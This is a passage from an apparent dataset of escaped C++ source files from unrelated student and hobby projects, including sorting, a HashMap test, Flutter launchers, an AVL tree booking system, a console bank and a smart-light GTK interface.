1){\n\t\tprintf(\"Invalid file\\n\");\n\t\tlongjmp(env, 11);\t\n\t}\n\tparallel_number = data_size / PARALLEL_SIZE;\n\tif (data_size % PARALLEL_SIZE) parallel_number++;\n\tcurrent_index = get_min_number_among_pow_of_2_which_is_greater_than(parallel_number);\n\n\tchar buffer1[300],\n\t\t buffer2[300];\n\t\n\tint file_number;\n\tint record_count = 0;\n\tfor (int i=0; i<parallel_number; i++){\n\t\tfile_number = current_index + i;\n\n\t\tint record = 0;\n\t\tstd::vector<int> v;\n\t\tint j;\n\t\tfor (j=0;\n\t\t\tj<PARALLEL_SIZE && record_count < data_size;\n\t\t\tj++, record_count++\n\t\t){\n\t\t\tfscanf(input, \"%d\", &record);\n\t\t\tv.push_back(record);\n\t\t}\n\n\t\tstd::sort(v.begin(), v.end());\n\n\t\twrite_file_name_to_buffer_by_number(buffer1, file_number);\n\t\tFILE* temp_output = ffopen(buffer1, \"w\");\n\n\t\tint temp_size = j;\n\t\tfprintf(temp_output, \"%d\\n\", temp_size);\n\t\t\n\t\tfor (int j=0; j<temp_size; j++){\n\t\t\tfprintf(temp_output, \"%d\\n\", v[j]);\n\t\t}\n\t\n\t\tfclose(temp_output);\n\t}\n}\n\nvoid external_sort(const char* output_file_name){\n\tint max_child = current_index + parallel_number;//-1;\n\tfor (\n\t\tcurrent_index >>=1;\n\t\tcurrent_index != 0;\n\t\tcurrent_index >>=1,\n//\t\tmax_child = max_child/2\n\t\tmax_child = (max_child+1)/2\n//\t\tmax_child = (max_child)/2+1\n\t){\n\t\tprintf(\"max_child:%d\\n\", max_child);\n\t\tint upper = current_index<<1;\n\t\tfor (int father=current_index; father<upper; father++){\n\t\t\tint child1 = father*2;\n\t\t\tif (child1 == max_ch",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"rive_animation\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <gtest/gtest.h>\n\n#include <optional>\n#include <string>\n\n#include \"../include/HashMap.hpp\"\n\n// NOLINTNEXTLINE(modernize-use-trailing-return-type,readability-function-cognitive-complexity)\nTEST(PutAndGetTestBasicType, AssertionTrue) {\n  JAVA::HashMap<int, int> h1;\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  for (int i = 0; i < 1000; i++) {\n    h1.Put(i, i + 1);\n  }\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  for (int i = 0; i < 10000; i++) {\n    // NOLINTNEXTLINE(readability-magic-numbers)\n    if (i < 1000) {\n      ASSERT_EQ(h1.Get(i), std::make_optional(i + 1));\n    } else {\n      ASSERT_EQ(h1.Get(i), std::nullopt);\n    }\n  }\n\n  JAVA::HashMap<const char *, int> h2;\n  h2.Put(\"Hello world\", 1);\n  h2.Put(\"Hello world\", 2);\n  h2.Put(\"Hello world1\", 3);\n\n  ASSERT_NE(h2.Get(\"Hello world\"), std::make_optional(1));\n  ASSERT_EQ(h2.Get(\"Hello world\"), std::make_optional(2));\n  ASSERT_EQ(h2.Get(\"Hello world1\"), std::make_optional(3));\n  ASSERT_EQ(h2.Get(\"Hello world2\"), std::nullopt);\n}\n\n// NOLINTNEXTLINE(modernize-use-trailing-return-type)\nTEST(PutAndGetTestString, AssertionTrue) {\n  JAVA::HashMap<std::string, int> h3;\n  h3.Put(std::string(\"Hello world\"), 1);\n  h3.Put(std::string(\"Hello world\"), 2);\n  h3.Put(std::string(\"Hello world1\"), 3);\n\n  ASSERT_NE(h3.Get(std::string(\"Hello world\")), std::make_optional(1));\n  ASSERT_EQ(h3.Get(std::string(\"Hello world\")), std::make_optional(2));\n  ASSERT_EQ(h3.Get(std::string(\"Hello world1\")), std::make_optional(3));\n  ASSERT_EQ(h3.Get(std::string(\"Hello world2\")), std::nullopt);\n}\n\n//======================================================================\n\nclass MyClass {\n private:\n  friend class std::hash<MyClass>;\n\n  std::string name;\n  std::size_t age;\n\n public:\n  MyClass(std::string name, std::size_t age) noexcept\n      : name(std::move(name)), age(age) {}\n\n  auto operator==(const MyClass &other) const noexcept -> bool {\n    return name == other.name && age == other.age;\n  }\n};\n\ntemplate <>\nstruct std::hash<MyClass> {\n  auto operator()(const MyClass &obj) const -> std::size_t {\n    std::size_t ans = 0;\n    ans += std::hash<std::size_t>()(obj.age);\n    ans += std::hash<std::string>()(obj.name);\n    return ans;\n  }\n};\n\n// NOLINTNEXTLINE(modernize-use-trailing-return-type)\nTEST(PutAndGetTestMyClassType, AssertionTrue) {\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  MyClass obj1(\"jack\", 42);\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  MyClass obj2(\"Tom\", 42);\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  MyClass obj3(\"Tom\", 42);\n  // NOLINTNEXTLINE(readability-magic-numbers)\n  MyClass obj4(\"Tom\", 45);\n\n  ASSERT_EQ(obj2, obj3);\n  JAVA::HashMap<MyClass, std::string> h;\n  h.Put(obj1, std::string(\"lisa\"));\n  ASSERT_EQ(h.Get(obj1), std::make_optional(std::string(\"lisa\")));\n\n  h.Put(obj1, std::string(\"liSA\"));\n  ASSERT_EQ(h.Get(obj1), std::make_optional(std::string(\"liSA\")));\n\n  h.Put(obj2, std::string(\"Kali\"));\n  ASSERT_EQ(h.Get(obj2), std::make_optional(std::string(\"Kali\")));\n  ASSERT_EQ(h.Get(obj2), h.Get(obj3));\n\n  ASSERT_EQ(h.Get(obj4), std::nullopt);\n}\n\nauto main(int argc, char **argv) -> int {\n  ::testing::InitGoogleTest(&argc, argv);\n  ::testing::FLAGS_gtest_output = \"stdout:\";\n  return RUN_ALL_TESTS();\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n#include <thread>\r\n#include <chrono>\r\n\r\nusing namespace std;\r\n\r\n// \ud504\ub85c\uc138\uc2a4 \ud074\ub798\uc2a4 \uc815\uc758\r\nclass Process {\r\npublic:\r\n    int pid;  // \ud504\ub85c\uc138\uc2a4 ID\r\n    bool is_fg;  // Foreground \ud504\ub85c\uc138\uc2a4 \uc5ec\ubd80\r\n\r\n    Process(int pid, bool is_fg = false) : pid(pid), is_fg(is_fg) {}\r\n};\r\n\r\n// \uc2a4\ud0dd \ub178\ub4dc \ud074\ub798\uc2a4 \uc815\uc758\r\nclass StackNode {\r\npublic:\r\n    vector<Process*> process_list;  // \ud504\ub85c\uc138\uc2a4 \ub9ac\uc2a4\ud2b8\r\n    StackNode* next;  // \ub2e4\uc74c \uc2a4\ud0dd \ub178\ub4dc\ub97c \uac00\ub9ac\ud0a4\ub294 \ud3ec\uc778\ud130\r\n\r\n    StackNode() : next(nullptr) {}\r\n};\r\n\r\n// Dynamic Queue \ud074\ub798\uc2a4 \uc815\uc758\r\nclass DynamicQueue {\r\n    friend class MonitorProcess;\r\npublic:\r\n    StackNode* get_top() const {\r\n        return top;\r\n    }\r\nprivate:\r\n    StackNode* top;  // \uc2a4\ud0dd\uc758 \ub9e8 \uc704 \ub178\ub4dc\ub97c \uac00\ub9ac\ud0a4\ub294 \ud3ec\uc778\ud130\r\n    int num_nodes;  // \uc2a4\ud0dd \ub178\ub4dc\uc758 \uac1c\uc218\r\n\r\npublic:\r\n    DynamicQueue() : top(nullptr), num_nodes(0) {}\r\n\r\n    // enqueue \ud568\uc218: \uc2a4\ud0dd\uc758 \ub9e8 \uc704 \ub178\ub4dc\uc5d0 \ud504\ub85c\uc138\uc2a4 \ucd94\uac00\r\n    void enqueue(Process* process) {\r\n        if (top == nullptr) {\r\n            top = new StackNode();\r\n            num_nodes++;\r\n        }\r\n        if (process->is_fg) {\r\n            // FG \ud504\ub85c\uc138\uc2a4\uba74 \ub9ac\uc2a4\ud2b8\uc758 \ub05d\uc5d0 \ucd94\uac00\r\n            top->process_list.push_back(process);\r\n        }\r\n        else {\r\n            // BG \ud504\ub85c\uc138\uc2a4\uba74 \ub9ac\uc2a4\ud2b8\uc758 \ucc98\uc74c\uc5d0 \ucd94\uac00\r\n            top->process_list.insert(top->process_list.begin(), process);\r\n        }\r\n    }\r\n\r\n    // dequeue \ud568\uc218: \uc2a4\ud0dd\uc758 \ub9e8 \uc704 \ub178\ub4dc\uc5d0\uc11c \ud504\ub85c\uc138\uc2a4 \uaebc\ub0b4\uae30\r\n    Process* dequeue() {\r\n        if (top == nullptr || top->process_list.empty()) {\r\n            return nullptr;\r\n        }\r\n        Process* process = top->process_list.back();\r\n        top->process_list.pop_back();\r\n        if (top->process_list.empty()) {\r\n            // \uc2a4\ud0dd\uc774 \ube44\uc5b4\uc788\uc73c\uba74 top \ub178\ub4dc \uc81c\uac70\r\n            StackNode* temp = top;\r\n            top = top->next;\r\n            delete temp;\r\n            num_nodes--;\r\n        }\r\n        return process;\r\n    }\r\n\r\n    // promote \ud568\uc218: \uc2a4\ud0dd\uc758 \ub9e8 \uc704 \ub178\ub4dc\uc5d0\uc11c \ud504\ub85c\uc138\uc2a4\ub97c \uaebc\ub0b4\uc5b4 \uc0c1\uc704 \ub9ac\uc2a4\ud2b8 \ub178\ub4dc\uc758 \uaf2c\ub9ac\uc5d0 \ubd99\uc774\uae30\r\n    void promote() {\r\n        Process* process = dequeue();\r\n        if (process == nullptr) {\r\n            return;\r\n        }\r\n        if (top == nullptr) {\r\n            top = new StackNode();\r\n            num_nodes++;\r\n        }\r\n        top->process_list.push_back(process);\r\n    }\r\n\r\n    // split_n_merge \ud568\uc218: \uc784\uacc4\uce58(threshold)\ub97c \ub118\uc5b4\uc124 \uacbd\uc6b0 \ub9ac\uc2a4\ud2b8\uc758 \uc55e\ucabd \uc808\ubc18\uc744 \uc0c1\uc704 \ub9ac\uc2a4\ud2b8 \ub178\ub4dc\uc758 \uaf2c\ub9ac\uc5d0 \ubd99\uc774\uae30\r\n    void split_n_merge(int threshold) {\r\n        if (num_nodes > threshold) {\r\n            StackNode* new_node = new StackNode();\r\n            int half = num_nodes / 2;\r\n            while (half--) {\r\n                Process* process = dequeue();\r\n                new_node->process_list.insert(new_node->process_list.begin(), process);\r\n            }\r\n            new_node->next = top;\r\n            top = new_node;\r\n            num_nodes++;\r\n        }\r\n    }\r\n\r\n    // DQ(Dynamic Queue)\uc640 WQ(Wait Queue) \uc0c1\ud0dc \uc2dc\uac01\uc801\uc73c\ub85c \ucd9c\ub825\r\n    void print_dq_wq_status() {\r\n        cout << \"DQ: \";\r\n        StackNode* current_node = top;\r\n        while (current_node != nullptr) {\r\n            for (Process* process : current_node->process_list) {\r\n                cout << process->pid << \" \";\r\n            }\r\n            current_node = current_node->next;\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\n// Alarm Clock \uad6c\ud604\r\nclass AlarmClock {\r\nprivate:\r\n    int total_processes;  // \uc804\uccb4 \ud504\ub85c\uc138\uc2a4 \uac1c\uc218\r\n    int num_nodes;  // \uc2a4\ud0dd \ub178\ub4dc\uc758 \uac1c\uc218\r\n    int threshold;  // \uc784\uacc4\uce58\r\n\r\npublic:\r\n    AlarmClock(int total_processes, int num_nodes) : total_processes(total_processes), num_nodes(num_nodes), threshold(total_processes / num_nodes) {}\r\n\r\n    // \uc0c8\ub85c\uc6b4 \uc784\uacc4\uce58 \uc124\uc815\r\n    void set_threshold(int new_threshold) {\r\n        threshold = new_threshold;\r\n    }\r\n\r\n    // \ud604\uc7ac \uc784\uacc4\uce58 \ubc18\ud658\r\n    int get_threshold() {\r\n        return threshold;\r\n    }\r\n};\r\n\r\n// shell \ud504\ub85c\uc138\uc2a4 \ub3d9\uc791\r\nclass ShellProcess {\r\npublic:\r\n    void execute_command(const string& command) {\r\n        // \uba85\ub839\uc5b4 \uc2e4\ud589\r\n    }\r\n\r\n    void sleep(int seconds) {\r\n        // \uc77c\uc815 \uc2dc\uac04 \ub3d9\uc548 sleep\r\n        this_thread::sleep_for(chrono::seconds(seconds));\r\n    }\r\n};\r\n\r\n// monitor \ud504\ub85c\uc138\uc2a4 \ub3d9\uc791\r\nclass MonitorProcess {\r\nprivate:\r\n    DynamicQueue& dynamic_queue;\r\n    AlarmClock& alarm_clock;\r\n\r\npublic:\r\n    MonitorProcess(DynamicQueue& dq, AlarmClock& ac) : dynamic_queue(dq), alarm_clock(ac) {}\r\n\r\n    void print_dq_wq_status() {\r\n        // DQ(Dynamic Queue)\uc640 WQ(Wait Queue) \uc0c1\ud0dc \uc2dc\uac01\uc801\uc73c\ub85c \ucd9c\ub825\r\n        cout << \"DQ: \";\r\n        StackNode* current_node = dynamic_queue.top;\r\n        while (current_node != nullptr) {\r\n            for (Process* process : current_node->process_list) {\r\n                cout << process->pid << \" \";\r\n            }\r\n            current_node = current_node->next;\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    // \ucd08\uae30\ud654\r\n    int total_processes = 20;  // \uc804\uccb4 \ud504\ub85c\uc138\uc2a4 \uac1c\uc218\r\n    int num_nodes = 5;  // \uc2a4\ud0dd \ub178\ub4dc\uc758 \uac1c\uc218\r\n    int sleep_time = 1;  // \uc2a4\ucf00\uc904\ub7ec \ud638\ucd9c \uc8fc\uae30 (\ucd08 \ub2e8\uc704)\r\n\r\n    DynamicQueue dynamic_queue;\r\n    AlarmClock alarm_clock(total_processes, num_nodes);\r\n    ShellProcess shell_process;\r\n    MonitorProcess monitor_process(dynamic_queue, alarm_clock);\r\n\r\n    // \ud504\ub85c\uc138\uc2a4 \uc0dd\uc131 \ubc0f enqueue\r\n    for (int i = 0; i < total_processes; ++i) {\r\n        Process* process = new Process(i, i % 2 == 0);  // \uc9dd\uc218 \ud504\ub85c\uc138\uc2a4\ub294 FG, \ud640\uc218 \ud504\ub85c\uc138\uc2a4\ub294 BG\ub85c \uac00\uc815\r\n      ",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: mleonard <mleonard@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/06/04 11:23:26 by mleonard          #+#    #+#             */\n/*   Updated: 2024/06/04 14:56:43 by mleonard         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <Harl.hpp>\n\nint main(void)\n{\n    Harl harl = Harl();\n\n    harl.complain(\"DEBUG\");\n    std::cout << std::endl;\n    harl.complain(\"INFO\");\n    std::cout << std::endl;\n    harl.complain(\"WARNING\");\n    std::cout << std::endl;\n    harl.complain(\"ERROR\");\n\n    return 0;\n}",
    "#include <iostream>  // Include the iostream library for input and output\r\n#include <string>    // Include the string library for string manipulations\r\n#include <algorithm> // Include the algorithm library for the reverse function\r\n\r\nusing namespace std; // Use the standard namespace\r\n\r\nint main()\r\n{\r\n    int num; // Declare an integer variable to store the user's input\r\n    cout << \"Enter a number: \"; // Prompt the user to enter a number\r\n    cin >> num; // Read the user's input and store it in the variable 'num'\r\n\r\n    // Check if the entered number is negative\r\n    if (num < 0)\r\n    {\r\n        cout << \"NO\" << endl; // Print \"NO\" if the number is negative\r\n    }\r\n    else\r\n    {\r\n        // Convert the number to a string\r\n        string str_num = to_string(num);\r\n        // Create a copy of the string to reverse\r\n        string rev_str_num = str_num;\r\n        // Reverse the string\r\n        reverse(rev_str_num.begin(), rev_str_num.end());\r\n\r\n        // Check if the original string and the reversed string are the same\r\n        if (str_num == rev_str_num)\r\n        {\r\n            cout << \"YES\" << endl; // Print \"YES\" if the number is a palindrome\r\n        }\r\n        else\r\n        {\r\n            cout << \"NO\" << endl; // Print \"NO\" if the number is not a palindrome\r\n        }\r\n    }\r\n\r\n    return 0; // Return 0 to indicate successful execution\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_gif\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Oscar Andres Mosquera Hinestroza\r\n// Ivan Alonso Hernandez\r\n\r\n#include <iostream>\r\n#include <malloc.h>\r\n\r\nusing namespace std;\r\n\r\nstruct NodoViaje {\r\n    char id[15];\r\n    float precio;\r\n    char destino[100];\r\n    char matricula[10];\r\n    char nombreEmbarcacion[100];\r\n    int dia, mes, annio;\r\n    int capacidad;\r\n    char **pasajeros;\r\n    int numPasajeros;\r\n    NodoViaje *izq;\r\n    NodoViaje *der;\r\n    int altura;\r\n};\r\n\r\nNodoViaje *raiz = NULL;\r\n\r\nNodoViaje* crearNodo() {\r\n    NodoViaje *nuevoNodo = (NodoViaje *)malloc(sizeof(NodoViaje));\r\n    if (!nuevoNodo) {\r\n        cerr << \"Error al asignar memoria\" << endl;\r\n        exit(1);\r\n    }\r\n    \r\n    cout << \"Ingrese el identificador del viaje: \";\r\n    cin >> nuevoNodo->id;\r\n    cout << \"Ingrese la matricula de la embarcacion: \";\r\n    cin >> nuevoNodo->matricula;\r\n    cout << \"Ingrese el nombre de la embarcacion: \";\r\n    cin >> nuevoNodo->nombreEmbarcacion;\r\n    cout << \"Ingrese la fecha del viaje (dia-mes-annio): \";\r\n    cin >> nuevoNodo->dia >> nuevoNodo->mes >> nuevoNodo->annio;\r\n    cout << \"Ingrese el precio del viaje: \";\r\n    cin >> nuevoNodo->precio;\r\n    cout << \"Ingrese el destino del viaje: \";\r\n    cin >> nuevoNodo->destino;\r\n    cout << \"Ingrese la capacidad de la embarcacion: \";\r\n    cin >> nuevoNodo->capacidad;\r\n\r\n    nuevoNodo->pasajeros = (char **)malloc(nuevoNodo->capacidad * sizeof(char *));\r\n    if (!nuevoNodo->pasajeros) {\r\n        cerr << \"Error al asignar memoria para pasajeros\" << endl;\r\n        free(nuevoNodo);\r\n        exit(1);\r\n    }\r\n\r\n    nuevoNodo->numPasajeros = 0;\r\n    nuevoNodo->izq = NULL;\r\n    nuevoNodo->der = NULL;\r\n    nuevoNodo->altura = 1;\r\n\r\n    return nuevoNodo;\r\n}\r\n\r\nint obtenerAltura(NodoViaje *nodo) {\r\n    return (nodo == NULL) ? 0 : nodo->altura;\r\n}\r\n\r\nint mayor(int a, int b) {\r\n    return (a > b) ? a : b;\r\n}\r\n\r\nint obtenerBalance(NodoViaje *nodo) {\r\n    return (nodo == NULL) ? 0 : obtenerAltura(nodo->izq) - obtenerAltura(nodo->der);\r\n}\r\n\r\nNodoViaje* rotarDerecha(NodoViaje *y) {\r\n    NodoViaje *x = y->izq;\r\n    NodoViaje *T2 = x->der;\r\n\r\n    x->der = y;\r\n    y->izq = T2;\r\n\r\n    y->altura = mayor(obtenerAltura(y->izq), obtenerAltura(y->der)) + 1;\r\n    x->altura = mayor(obtenerAltura(x->izq), obtenerAltura(x->der)) + 1;\r\n\r\n    return x;\r\n}\r\n\r\nNodoViaje* rotarIzquierda(NodoViaje *x) {\r\n    NodoViaje *y = x->der;\r\n    NodoViaje *T2 = y->izq;\r\n\r\n    y->izq = x;\r\n    x->der = T2;\r\n\r\n    x->altura = mayor(obtenerAltura(x->izq), obtenerAltura(x->der)) + 1;\r\n    y->altura = mayor(obtenerAltura(y->izq), obtenerAltura(y->der)) + 1;\r\n\r\n    return y;\r\n}\r\n\r\nint compararCadenas(const char *cadena1, const char *cadena2) {\r\n    while (*cadena1 && (*cadena1 == *cadena2)) {\r\n        cadena1++;\r\n        cadena2++;\r\n    }\r\n    return *(unsigned char *)cadena1 - *(unsigned char *)cadena2;\r\n}\r\n\r\nvoid copiarCadena(char *destino, const char *origen) {\r\n    while (*origen) {\r\n        *destino = *origen;\r\n        destino++;\r\n        origen++;\r\n    }\r\n    *destino = '\\0';\r\n}\r\n\r\nint longitudCadena(const char *cadena) {\r\n    int longitud = 0;\r\n    while (*cadena) {\r\n        longitud++;\r\n        cadena++;\r\n    }\r\n    return longitud;\r\n}\r\n\r\nNodoViaje* insertar(NodoViaje* nodo, NodoViaje* nuevoNodo) {\r\n    if (nodo == NULL) {\r\n        return nuevoNodo;\r\n    }\r\n\r\n    if (compararCadenas(nuevoNodo->id, nodo->id) < 0) {\r\n        nodo->izq = insertar(nodo->izq, nuevoNodo);\r\n    } else if (compararCadenas(nuevoNodo->id, nodo->id) > 0) {\r\n        nodo->der = insertar(nodo->der, nuevoNodo);\r\n    } else {\r\n        return nodo;\r\n    }\r\n\r\n    nodo->altura = 1 + mayor(obtenerAltura(nodo->izq), obtenerAltura(nodo->der));\r\n\r\n    int balance = obtenerBalance(nodo);\r\n\r\n    if (balance > 1 && compararCadenas(nuevoNodo->id, nodo->izq->id) < 0) {\r\n        return rotarDerecha(nodo);\r\n    }\r\n\r\n    if (balance < -1 && compararCadenas(nuevoNodo->id, nodo->der->id) > 0) {\r\n        return rotarIzquierda(nodo);\r\n    }\r\n\r\n    if (balance > 1 && compararCadenas(nuevoNodo->id, nodo->izq->id) > 0) {\r\n        nodo->izq = rotarIzquierda(nodo->izq);\r\n        return rotarDerecha(nodo);\r\n    }\r\n\r\n    if (balance < -1 && compararCadenas(nuevoNodo->id, nodo->der->id) < 0) {\r\n        nodo->der = rotarDerecha(nodo->der);\r\n        return rotarIzquierda(nodo);\r\n    }\r\n\r\n    return nodo;\r\n}\r\n\r\nNodoViaje* minValueNode(NodoViaje* nodo) {\r\n    NodoViaje* current = nodo;\r\n\r\n    while (current->izq != NULL)\r\n        current = current->izq;\r\n\r\n    return current;\r\n}\r\n\r\nNodoViaje* eliminar(NodoViaje* nodo, const char* id) {\r\n    if (nodo == NULL)\r\n        return nodo;\r\n\r\n    if (compararCadenas(id, nodo->id) < 0)\r\n        nodo->izq = eliminar(nodo->izq, id);\r\n    else if (compararCadenas(id, nodo->id) > 0)\r\n        nodo->der = eliminar(nodo->der, id);\r\n    else {\r\n        if ((nodo->izq == NULL) || (nodo->der == NULL)) {\r\n            NodoViaje *temp = nodo->izq ? nodo->izq : nodo->der;\r\n\r\n            if (temp == NULL) {\r\n                temp = nodo;\r\n                nodo = NULL;\r\n           ",
    "#include \"bank.hpp\"\n#include <memory>\n#include <fstream>\n\nint main() {\n    \n    //Appending to file.\n    std::ofstream File(\"bank.db\", std::ios::app);\n    \n    //Reading from bank.db file.\n    std::ifstream Read(\"bank.db\");\n    std::string last;\n    \n    if(Read.is_open()){\n    std::string lines;\n    while(getline(Read, lines)){\n        last = lines;\n        }\n      Read.close();\n    }\n    //Converts the last line of the bank.db file to numeric values.\n      double initial = FORMAT(last);\n       //Takes the double above and makes it the user's account balance.\n      double initial_ = BALANCE(initial);\n      \n      \n    //Read from salary.db file in JOB directory.\n    std::ifstream Job(\"JOB/salary.db\");\n    std::string collect;\n    \n    if(Job.is_open()){\n    std::string dis;\n    while(getline(Job, dis)){\n        collect = dis;\n        }\n      Job.close();\n    }\n    //Converts the last line of salary.db to a numerical value.\n    double salary = FORMAT(collect);\n    //Adds the value gotten in \"salary\" to the user's account balance.\n    double payment = BALANCE(salary);\n    \n    \n    \n    while (true) {\n          std::unique_ptr<std::string> message = std::make_unique<std::string>(Input<std::string>(\"Welcome to BrumSky Bank, would you like to make a transaction? `yes` or `no`: \"));\n          \n          //First condition.\n          if(*message == \"yes\"){\n                 std::unique_ptr<std::string> message_ = std::make_unique<std::string>(Input<std::string>(\"Options: `dep` for deposit, `wit` for withdraw, `bal` for account balance, and `bor` for borrow: \"));  \n                 \n                       if(*message_ == \"dep\"){\n                             \n                             //Pointer for the user to enter the amount that they want to deposit.\n        std::unique_ptr<double> wit_dep = std::make_unique<double>(Input<double>(\"Enter amount: \")); \n       \n       //Makes sure the user doesn't enter a value less than 1.\n       while(*wit_dep < 1){\n           std::cout<<\"Cannot deposit that amount!\\n\";\n           wit_dep = std::make_unique<double>(Input<double>(\"Enter amount: \")); \n       }\n       \n        //Pointer for calculating the user's account balance.\n        std::unique_ptr<double> account = std::make_unique<double>(BALANCE(*wit_dep));     \n                   \n        //Pointer for converting the user's account balance to a string.\n        std::unique_ptr<std::string> account_balance = std::make_unique<std::string>(CONVERT(*account));  \n                 \n        std::cout<<std::endl;  \n        \n        File << std::endl;\n                     \n        File<<\"Balance: \u20a6\" << *account_balance << std::endl;       \n        \n        std::cout << \"Balance: \u20a6\" << *account_balance << std::endl;    \n            \n        std::cout<<std::endl;\n                           }\n                           \n                       else if(*message_ == \"wit\"){\n                           //Pointer for the user to enter the amount that they want to deposit.\n                          std::unique_ptr<double> wit_dep_ = std::make_unique<double>(Input<double>(\"Enter amount: \"));           \n         \n                         double qwerty = BALANCE(0);          \n                                \n                                   if(*wit_dep_ > qwerty){\n                                          std::cout<<\"Cannot withdraw more than account balance! Put funds first.\\n\";                                                                    \n                                    }    \n                                  else{         \n                                           //Pointer for calculating the user's account balance .\n                         std::unique_ptr<double> account_ = std::make_unique<double>(BALANCE(-(*wit_dep_)));   \n                                         //Pointer for converting the user's account balance to a string.\n                                        std::unique_ptr<std::string> account_balance = std::make_unique<std::string>(CONVERT(*account_));                                              \n                                        std::cout<<std::endl; \n                                        File<<std::endl;           \n                                        std::cout << \"Balance: \u20a6\" << *account_balance << std::endl;    \n                                        File<< \"Balance: \u20a6\" << *account_balance << std::endl;   \n                                         std::cout<<std::endl;          \n                                  }\n                           }\n                           \n                       else if(*message_ == \"bor\"){\n                                 //Pointer for the user to enter the amount that they want to deposit.\n                                std::unique_ptr<double> _wit_dep_ = std::make_unique<double>(Input<double>(\"Enter amount: \"));     \n                                //Pointer for calculating the user's account balance.\n                                std::unique_ptr<double> _accoun",
    "#include \"UI.h\"\n#include <iostream>\n#include <curl/curl.h>\n\nUI::UI() :\n\tm_box(Gtk::Orientation::VERTICAL),\n  m_box1(Gtk::Orientation::HORIZONTAL),\n  m_labelBri(\"Brightness\"),\n  m_labelHue(\"Color\"),\n  m_labelSat(\"Saturation\"),\n  m_slidBri(Gtk::Orientation::HORIZONTAL),\n  m_slidHue(Gtk::Orientation::HORIZONTAL),\n  m_slidSat(Gtk::Orientation::HORIZONTAL),\n  m_btnsColors{      \n      Gtk::Button(\"Red\"), Gtk::Button(\"Orange\"), Gtk::Button(\"Yellow\"),\n      Gtk::Button(\"Forest\"), Gtk::Button(\"Green\"), Gtk::Button(\"Mint\"),\n      Gtk::Button(\"Cyan\"), Gtk::Button(\"Navy\"), Gtk::Button(\"Blue\"),\n      Gtk::Button(\"Purple\"), Gtk::Button(\"Magenta\"), Gtk::Button(\"Rose\")\n  },\n  m_btnsBri{\n      Gtk::Button(\"Low\"),Gtk::Button(\"Medium\"), Gtk::Button(\"High\"), Gtk::Button(\"Bright\")  \n  },\n  m_btnOn(\"On\"),\n  m_btnOff(\"Off\")\n{\n\tm_slidBri.set_range(0, 254);\n\tm_slidBri.set_value(1);\n\tm_slidBri.signal_value_changed().connect( [this] { this->slider_clicked(m_slidBri, std::string(\"bri\")); } );\n\tm_slidSat.set_range(0, 254);\n\tm_slidSat.set_value(1);\n\tm_slidSat.signal_value_changed().connect( [this] { this->slider_clicked(m_slidSat, std::string(\"sat\")); } );\n\tm_slidHue.set_range(0, 65535);\n\tm_slidHue.set_value(1);\n\tm_slidHue.signal_value_changed().connect( [this] { this->slider_clicked(m_slidHue, std::string(\"hue\")); } );\n\n\tm_grid.set_row_spacing(20); \n\tm_grid.set_column_spacing(20); \n\tm_grid.set_row_homogeneous(true); \n\tm_grid.set_column_homogeneous(true); \n\t\n\tint colors[12];\n\tfor (size_t i = 0; i < 12; i++) {\n\t\tcolors[i] = 5461 * i;\n\t\tif (i == 0) { colors[0] = 1; };\n\t}\n\n\tfor (size_t i = 0; i < m_btnsColors.size(); ++i) 